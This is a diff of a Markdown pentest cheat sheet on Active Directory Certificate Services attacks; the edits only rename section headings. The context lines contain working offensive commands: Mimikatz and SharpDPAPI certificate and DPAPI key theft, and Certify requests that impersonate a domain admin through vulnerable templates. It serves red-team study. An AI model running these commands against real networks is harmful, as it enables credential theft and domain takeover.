@@ -47,7 +47,7 @@ Cmd > certutil.exe -TCAInfo [-v]
 
 ## <mark style="color:red;">Hunt for Certificates</mark> <a href="#hunt-for-certificates" id="hunt-for-certificates"></a>
 
-### <mark style="color:orange;">Export Certificates (THEFT1)</mark> <a href="#export-certificates-theft-1" id="export-certificates-theft-1"></a>
+### <mark style="color:orange;">Export Certificates</mark> <a href="#export-certificates-theft-1" id="export-certificates-theft-1"></a>
 
 Export a certificate from user's context.
 
@@ -73,7 +73,7 @@ If the private key is non-exportable, use Mimikatz's `crypto::capi` (to patch CA
 Cmd > .\mimikatz.exe "crypto::capi" "crypto::certificates /export" "exit"
 ```
 
-### <mark style="color:orange;">DPAPI User Keys (THEFT2)</mark> <a href="#dpapi-user-keys-theft-2" id="dpapi-user-keys-theft-2"></a>
+### <mark style="color:orange;">DPAPI User Keys</mark> <a href="#dpapi-user-keys-theft-2" id="dpapi-user-keys-theft-2"></a>
 
 Decrypt a domain user's masterkey with domain's backup key with Mimikatz:
 
@@ -93,7 +93,7 @@ Simplify the process with SharpDPAPI providing it a file with one or more `{GUID
 Cmd > .\SharpDPAPI.exe certificates /mkfile:C:\Temp\mkeys.txt
 ```
 
-### <mark style="color:orange;">DPAPI Machine Keys (THEFT3)</mark> <a href="#dpapi-machine-keys-theft-3" id="dpapi-machine-keys-theft-3"></a>
+### <mark style="color:orange;">DPAPI Machine Keys</mark> <a href="#dpapi-machine-keys-theft-3" id="dpapi-machine-keys-theft-3"></a>
 
 It's not possible to decrypt machine keys using the domain's DPAPI backup key, so the adversary can use the `DPAPI_SYSTEM` LSA secret on the system which is accessible only by the SYSTEM user:
 
@@ -104,7 +104,7 @@ Cmd > .\SharpDPAPI.exe certificates /machine
 
 After converting the output to `.pfx` and if the appropriate EKU scenario is present, the adversary can use that `.pfx` for domain authentication _as the computer account_ (see **PERSIST2**).
 
-### <mark style="color:orange;">Search for Certificate Files (THEFT4)</mark> <a href="#search-for-certificate-files-theft-4" id="search-for-certificate-files-theft-4"></a>
+### <mark style="color:orange;">Search for Certificate Files</mark> <a href="#search-for-certificate-files-theft-4" id="search-for-certificate-files-theft-4"></a>
 
 Find certificate files lying around with Seatbelt:
 
@@ -151,7 +151,7 @@ Cmd > .\Seatbelt.exe -q CertificateThumbprints
 Cmd > .\Certify.exe find /quiet
 ```
 
-## <mark style="color:red;">Steal NTLM via PKINIT (THEFT5)</mark> <a href="#steal-ntlm-via-pkinit-theft-5" id="steal-ntlm-via-pkinit-theft-5"></a>
+### <mark style="color:orange;">Steal NTLM via PKINIT</mark>  <a href="#steal-ntlm-via-pkinit-theft-5" id="steal-ntlm-via-pkinit-theft-5"></a>
 
 Request NTLM hash when the account is authenticated with a TGT through PKINIT with Kekeo:
 
@@ -167,7 +167,7 @@ Discover vulnerable templates:
 Cmd > .\Certify.exe find /vulnerable
 ```
 
-### <mark style="color:orange;">Modifiable SAN + Smart Card Logon or Client Authentication or PKINIT Client Authentication EKUs (ESC1)</mark> <a href="#modifiable-san-smart-card-logon-or-client-authentication-or-pkinit-client-authentication-ekus-esc-1" id="modifiable-san-smart-card-logon-or-client-authentication-or-pkinit-client-authentication-ekus-esc-1"></a>
+### <mark style="color:orange;">Modifiable SAN + Smart Card Logon or Client Authentication or PKINIT Client Authentication EKUs</mark> <a href="#modifiable-san-smart-card-logon-or-client-authentication-or-pkinit-client-authentication-ekus-esc-1" id="modifiable-san-smart-card-logon-or-client-authentication-or-pkinit-client-authentication-ekus-esc-1"></a>
 
 Condition: the vulnerable certificate template allows requesters to specify a SAN in the CSR as well as allows Smart Card Logon (`1.3.6.1.4.1.311.20.2.2`) or Client Authentication (`1.3.6.1.5.5.7.3.2`) or PKINIT Client Authentication (`1.3.6.1.5.2.3.4`) EKUs.
 
@@ -183,7 +183,7 @@ Request a certificate specifying the `/altname` as a domain admin:
 Cmd > .\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:VulnTemplate /altname:DomAdmin
 ```
 
-### <mark style="color:orange;">Modifiable SAN + Any Purpose EKU (ESC2)</mark> <a href="#modifiable-san-any-purpose-eku-esc-2" id="modifiable-san-any-purpose-eku-esc-2"></a>
+### <mark style="color:orange;">Modifiable SAN + Any Purpose EKU</mark>  <a href="#modifiable-san-any-purpose-eku-esc-2" id="modifiable-san-any-purpose-eku-esc-2"></a>
 
 Condition: the vulnerable certificate template allows requesters to specify a SAN in the CSR as well as allows Any Purpose EKU (`2.5.29.37.0`).
 
@@ -195,7 +195,7 @@ PS > Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-en
 
 Request a certificate specifying the `/altname` as a domain admin like in **ESC1**.
 
-### <mark style="color:orange;">Agent Certificate + Enroll on Behalf of Another User (ESC3)</mark> <a href="#agent-certificate-enroll-on-behalf-of-another-user-esc-3" id="agent-certificate-enroll-on-behalf-of-another-user-esc-3"></a>
+### <mark style="color:orange;">Agent Certificate + Enroll on Behalf of Another User</mark> <a href="#agent-certificate-enroll-on-behalf-of-another-user-esc-3" id="agent-certificate-enroll-on-behalf-of-another-user-esc-3"></a>
 
 Conditions:
 
@@ -214,7 +214,7 @@ Cmd > .\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:Vuln-EnrollAg
 Cmd > .\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:User /onbehalfon:MEGACORP\ITAdmin /enrollcert:enrollmentAgentCert.pfx /enrollcertpw:Passw0rd!
 ```
 
-### <mark style="color:orange;">Vulnerable Certificate Template ACEs (ESC4)</mark> <a href="#vulnerable-certificate-template-aces-esc-4" id="vulnerable-certificate-template-aces-esc-4"></a>
+### <mark style="color:orange;">Vulnerable Certificate Template ACEs</mark> <a href="#vulnerable-certificate-template-aces-esc-4" id="vulnerable-certificate-template-aces-esc-4"></a>
 
 * ​[https://github.com/cfalta/PoshADCS](https://github.com/cfalta/PoshADCS)​
 
@@ -226,9 +226,7 @@ Cmd > .\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:User /onbehal
 | `WriteDacl`     | Can modify access control to grant an adversary `FullControl`. |
 | `WriteProperty` | Can edit any properties.                                       |
 
-### <mark style="color:orange;">Vulnerable PKI Object ACEs (ESC5)</mark> <a href="#vulnerable-pki-object-aces-esc-5" id="vulnerable-pki-object-aces-esc-5"></a>
-
-#### `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6) <a href="#editf_attributesubjectaltname2-esc-6" id="editf_attributesubjectaltname2-esc-6"></a>
+### <mark style="color:orange;">`EDITF_ATTRIBUTESUBJECTALTNAME2`</mark> <a href="#editf_attributesubjectaltname2-esc-6" id="editf_attributesubjectaltname2-esc-6"></a>
 
 > If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name.
 
@@ -266,7 +264,7 @@ Remove this setting:
 Cmd > certutil.exe -config "CA01.megacorp.local\CA01" -setreg "policy\EditFlags" -EDITF_ATTRIBUTESUBJECTALTNAME2
 ```
 
-### <mark style="color:orange;">Vulnerable CA ACEs (ESC7)</mark> <a href="#vulnerable-ca-aces-esc-7" id="vulnerable-ca-aces-esc-7"></a>
+### <mark style="color:orange;">Vulnerable CA ACEs</mark> <a href="#vulnerable-ca-aces-esc-7" id="vulnerable-ca-aces-esc-7"></a>
 
 Enumarate CA ACEs with Powershell [PSPKI](https://github.com/PKISolutions/PSPKI):
 
